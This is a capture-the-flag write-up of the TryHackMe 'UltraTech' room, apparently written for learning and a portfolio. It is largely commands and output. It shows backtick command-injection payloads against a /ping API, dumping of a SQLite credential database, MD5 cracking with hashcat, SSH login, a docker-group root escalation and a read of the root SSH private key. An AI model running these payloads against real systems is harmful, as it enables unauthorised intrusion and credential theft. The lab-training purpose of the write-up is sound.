# 🛡️ TryHackMe – UltraTech - Writeup

## 📌 Overview
**Room Name:** UltraTech  
**Platform:** TryHackMe  
**Difficulty:** Medium  
**Category:** Web / Command Injection / SQLite / Hash Cracking / Docker

Linux machine running a Node.js API server on port 8081 alongside an Apache web server on port 31331. Command injection in an exposed `/ping` endpoint extracts a SQLite database; cracked MD5 hashes give SSH access, then docker group membership escalates to root.

Attack chain overview:

- Port scan → FTP(21), SSH(22), Node.js API(8081), Apache(31331)
- `robots.txt` → `/utech_sitemap.txt` → `/partners.html` → `api.js` exposes `/ping?ip=` and `/auth`
- Command injection in `/ping`; backtick substitution (`%60whoami%60`) succeeds where `;` fails
- Filesystem enumeration via injection discovers `/home/www/api/utech.db.sqlite`
- `cat` leaks two MD5 hashes; `hashcat -m 0` cracks `r00t:n100906` → SSH
- `id` reveals docker group; `docker run -v /:/mnt bash chroot /mnt sh` → root → `/root/.ssh/id_rsa`

---

## 🔍 1. Enumeration

### 🔎 Port Scan

```bash
rustscan -a <TARGET_IP> -r 1-65535 -- -sV -sC
```

```text
21/tcp    open  ftp      vsftpd
22/tcp    open  ssh      OpenSSH
8081/tcp  open  http     Node.js Express
31331/tcp open  http     Apache httpd
```

Two HTTP servers on the same host — different ports allow both to coexist. Port 31331 served the public-facing website; port 8081 looked like a backend API exposed to the internet, which is immediately suspicious.

---

## 🔍 2. Web Enumeration

### Two HTTP servers

```bash
curl -v http://<TARGET_IP>:31331/
# → UltraTech website

curl -v http://<TARGET_IP>:8081/
# → UltraTech api v0.1.3
```

Port 31331 was the company website. Port 8081 was an API server with no authentication gate visible — backend services should never be directly reachable from the internet.

### robots.txt → sitemap → login page

```bash
curl http://<TARGET_IP>:31331/robots.txt
```

```text
Allow: *
Sitemap: /utech_sitemap.txt
```

```bash
curl http://<TARGET_IP>:31331/utech_sitemap.txt
```

```text
/
/index.html
/what.html
/partners.html
```

`/partners.html` was a login page. Brute-forcing credentials at this stage was premature — the HTML source was checked first for clues.

### api.js — API endpoint discovery

The login page referenced two JS files: `app.min.js` (UI code) and `api.js`. The filename `api.js` on a login page suggested it would contain endpoint definitions.

```bash
curl http://<TARGET_IP>:31331/js/api.js
```

```javascript
// ...
if (id === 'users') {
    fetch(`/ping?ip=${window.location.hostname}`)
    // ...
}
// auth endpoint: /auth
```

Two endpoints found:
- `/ping?ip=` — takes a user-supplied IP and runs `ping` server-side
- `/auth` — the login endpoint

```bash
curl http://<TARGET_IP>:8081/ping?ip=<TARGET_IP>
```

```text
PING <TARGET_IP> (<TARGET_IP>): 56 data bytes
64 bytes from <TARGET_IP>: ...
```

The server returned live ping output. Passing raw shell input to `ping` is a textbook command injection setup.

---

## 💥 3. Command Injection

### Shell metacharacters and the quoting problem

The first instinct was to append commands with `&&` or `;`:

```bash
curl http://<TARGET_IP>:8081/ping?ip=<TARGET_IP> && whoami
curl http://<TARGET_IP>:8081/ping?ip=<TARGET_IP>;whoami
```

Both ran `whoami` locally — `&&` and `;` are shell metacharacters. Without quoting the entire URL, the local Kali shell interprets them before curl ever sends the request.

Wrapping the URL in quotes sends the characters to the server:

```bash
curl "http://<TARGET_IP>:8081/ping?ip=<TARGET_IP>;whoami"
```

```text
ping: <TARGET_IP>whoami: Name or service not known
```

Server-side execution confirmed — the server is definitely running a command. But `;` wasn't acting as a separator: the entire string `<TARGET_IP>;whoami` was being passed as a single argument to `ping`.

### URL encoding attempts

Adding a space before `;` to separate it from the IP:

```bash
curl "http://<TARGET_IP>:8081/ping?ip=<TARGET_IP> ;whoami"
# → curl: (3) URL rejected: Malformed input to a URL function
```

URL-encoding the space as `%20`:

```bash
curl "http://<TARGET_IP>:8081/ping?ip=<TARGET_IP>%20;whoami"
```

```text
ping: whoami: Temporary failure in name resolution
```

Still being treated as a single argument — `whoami` was passed to `ping`, not executed. URL-encoding `;` as `%3B` produced the same result.

> **Why `;` didn't work:** The server-side code likely passes the `ip` parameter through `ping` as a shell argument. The `;` URL-encoded or not was still being concatenated into the `ip` string before shell parsing happened — or the server was running `ping` via `execve` rather than a shell, meaning only a true command substitution would force re-evaluation.

### Backtick substitution — the breakthrough

Backtick (`` ` ``) is `%60` in URL encoding. Inside backticks, the shell executes the command first and substitutes the output — this happens at the shell level before `ping` receives its argument.

```bash
curl "http://<TARGET_IP>:8081/ping?ip=%60whoami%60"
```

```text
ping: www: Temporary failure in name resolution
```

`whoami` ran server-side. The server user is **`www`**. The output `www` was passed to `ping` as the hostname, which failed to resolve — confirming remote code execution.

---

## 🗄️ 4. Credential Extraction

### Filesystem enumeration

```bash
curl "http://<TARGET_IP>:8081/ping?ip=%60ls%20/home%60"
# → ping: www: Temporary failure in name resolution
```

`/home/www` exists. Drilling down:

```bash
curl "http://<TARGET_IP>:8081/ping?ip=%60ls%20/home/www%60"
# → ping: api: Temporary failure in name resolution

curl "http://<TARGET_IP>:8081/ping?ip=%60ls%20/home/www/api%60"
# → ping: utech.db.sqlite: Name or service not known
```

A SQLite database file at `/home/www/api/utech.db.sqlite` — almost certainly the authentication store for the API server.

### Extracting the database — strings vs cat

First attempt with `strings` (extracts printable characters from binaries):

```bash
curl "http://<TARGET_IP>:8081/ping?ip=%60strings%20/home/www/api/utech.db.sqlite%60"
```

```text
ping: admin0d0ea5111e3c1def594c1684e3b9be84: Name or service not known
```

Only one line came through. `strings` outputs multiple lines; `ping` only receives the first line of the command substitution output. Tried chaining `| tail` and `| head` to get other lines, but `|` (`%7C`) was not interpreted as a pipe — it was passed literally to the command, breaking the injection.

> **Why `cat` works where `strings` doesn't:** `strings` outputs one string per line. When backtick substitution captures multi-line output and passes it to `ping`, only the first word (up to whitespace or newline) is treated as the hostname argument. `cat` on a binary file dumps everything as a single stream of bytes with no line breaks in the relevant section — the entire content arrives as one blob in the ping error message.

```bash
curl "http://<TARGET_IP>:8081/ping?ip=%60cat%20/home/www/api/utech.db.sqlite%60"
```

```text
ping: ···(r00tf357a0c52799563c7c7b76c1e7543a32)admin0d0ea5111e3c1def594c1684e3b9be84: Name or service not known
```

Two user records visible:

| User  | Hash                               |
|-------|------------------------------------|
| r00t  | `f357a0c52799563c7c7b76c1e7543a32` |
| admin | `0d0ea5111e3c1def594c1684e3b9be84` |

Both are 32-character hexadecimal strings — MD5.

---

## 🔓 5. Hash Cracking

```bash
hashcat -m 0 'f357a0c52799563c7c7b76c1e7543a32' /usr/share/wordlists/rockyou.txt
```

```text
f357a0c52799563c7c7b76c1e7543a32:n100906
```

Credentials recovered: **`r00t:n100906`**

---

## 🖥️ 6. Initial Access

SSH was confirmed open on port 22 during the initial scan.

```bash
ssh r00t@<TARGET_IP>
# Password: n100906
```

```text
r00t@ultratech-prod:~$
```

**Initial access as `r00t` achieved.** ✅

---

## 👑 7. Privilege Escalation: r00t → root (Docker)

### SUID enumeration (dead end)

```bash
find / -perm -4000 2>/dev/null
```

Nothing non-standard stood out. Moved to checking group memberships.

### Docker group — the real vector

```bash
id
```

```text
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

`r00t` is a member of the `docker` group. This is a well-known privilege escalation path: any user who can run `docker` can mount the host filesystem into a container and operate on it as root, because the Docker daemon itself runs as root.

```bash
docker images
```

```text
REPOSITORY  TAG     IMAGE ID      CREATED
bash        latest  495d6437fc1e  ...
```

A `bash` image is available — no need to pull anything.

### Exploitation

```bash
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

- `-v /:/mnt` — mounts the host's entire root filesystem into the container at `/mnt`
- `chroot /mnt` — shifts the container's root to `/mnt`, making all paths resolve against the host filesystem
- The container process runs as root, so this is effectively unrestricted root access to the host

```bash
whoami
# → root
```

**ROOT ACCESS GRANTED.** ✅

### Flag retrieval

```bash
cd /root/.ssh
cat id_rsa
```

The root SSH private key was retrieved, completing the room.

---

## 📚 Key Takeaways

- 🐚 **Shell metacharacters in curl must be URL-encoded or quoted:** `&&` and `;` are consumed by the local shell before curl fires if the URL isn't quoted. Even after quoting, the server may not treat `;` as a separator — URL-encoding (`%3B`) doesn't guarantee the server's shell parses it as such either.

- 🔁 **Backtick substitution is a reliable injection vector when `;` fails:** `` `cmd` `` (`%60cmd%60`) forces the shell to evaluate `cmd` first and substitute the output. It bypasses the argument-concatenation issue entirely because the shell must evaluate backticks before constructing the ping argument.

- 📄 **`cat` beats `strings` when the output is consumed as a single argument:** `strings` splits output into lines — only the first reaches `ping`. `cat` on a binary dumps everything as one blob, so the entire file content arrives in the error message. When command output feeds into another command as a single argument, single-output commands are more reliable than line-oriented ones.

- 📜 **JS files referenced from login pages often contain API endpoints:** `api.js` wasn't linked from the main page — it appeared only in the login page's source. Checking all script tags, especially on auth-related pages, is a reliable step in web recon.

- 🗺️ **`robots.txt` → sitemap → hidden pages is a standard enumeration chain:** `robots.txt` pointed to `/utech_sitemap.txt`, which listed `/partners.html`. Neither would have appeared in a standard directory brute-force. Always read `robots.txt` before throwing wordlists at a target.

- 🐳 **Docker group membership = effective root:** Any user in the `docker` group can mount the host filesystem into a container that runs as root. `id` should always be run immediately after gaining a shell — group memberships can be more valuable than SUID binaries. This is listed on GTFOBins and is a standard post-exploitation check.

---

## 🛠️ Tools Used

- `rustscan`
- `curl`
- `hashcat`
- `ssh`
- `docker`

---

## 📚 Credit
✍️ Author: Akira Hasuo

📘 Created for educational and portfolio purposes only
